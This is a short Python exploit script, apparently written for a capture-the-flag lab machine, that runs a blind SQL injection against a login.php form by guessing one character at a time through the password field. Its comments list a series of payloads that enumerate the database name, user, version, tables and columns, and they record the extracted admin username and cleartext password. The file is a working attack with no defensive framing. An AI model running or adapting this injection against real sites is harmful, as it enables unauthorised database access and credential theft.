#!/usr/bin/env python3
# xeniel was here

import requests

charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$^&*()-_=+{}'

result = ""

url = "http://10.10.10.185:80/login.php"
cookies = {"PHPSESSID": "h3bulcdichh744h56bjne7r50r"}
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://10.10.10.185", "DNT": "1", "Connection": "close", "Referer": "http://10.10.10.185/login.php", "Upgrade-Insecure-Requests": "1", "Sec-GPC": "1"}

for i in range(30):
	for c in charset:

		# "'or substr(database(),{},1) like binary '{}".format(i,c) 
		# Magic

		# "'or substr(user(),{},1) like binary '{}".format(i,c)
		# theseus@localhost

		# "'or substr(@@version,{},1) like binary '{}".format(i,c)
		# 5_7_29-0ubuntu0_1

		# "'or MID(@@hostname,{},1) like binary '{}".format(i,c)
		# ubuntu

		# "'or substr((SELECT table_name FROM information_schema.tables where table_schema = database() limit 0,1),{},1) like binary '{}".format(i,c)
		# login

		# "'or substr((SELECT column_name from information_schema.columns where table_schema = database() and table_name ='login' limit 0,1),{},1) like binary '{}".format(i,c)
		# id

		# "'or substr((SELECT column_name from information_schema.columns where table_schema = database() and table_name ='login' limit 1,1),{},1) like binary '{}".format(i,c)
		# username
		
		# "'or substr((SELECT column_name from information_schema.columns where table_schema = database() and table_name ='login' limit 2,1),{},1) like binary '{}".format(i,c)
		# password

		# "'or substr(username,{},1) like binary '{}".format(i,c)
		# admin

		# "'or substr(password,{},1) like binary '{}".format(i,c)
		# Th3s3usW4sK1ng

		payload = "'or substr(database(),{},1) like binary '{}".format(i,c)
		data = {"username": "admin", "password": payload}
		r = requests.post(url, headers=headers, cookies=cookies, data=data)

		if "Wrong Username or Password" not in r.text:
			result += c 
			print(result)
			break;
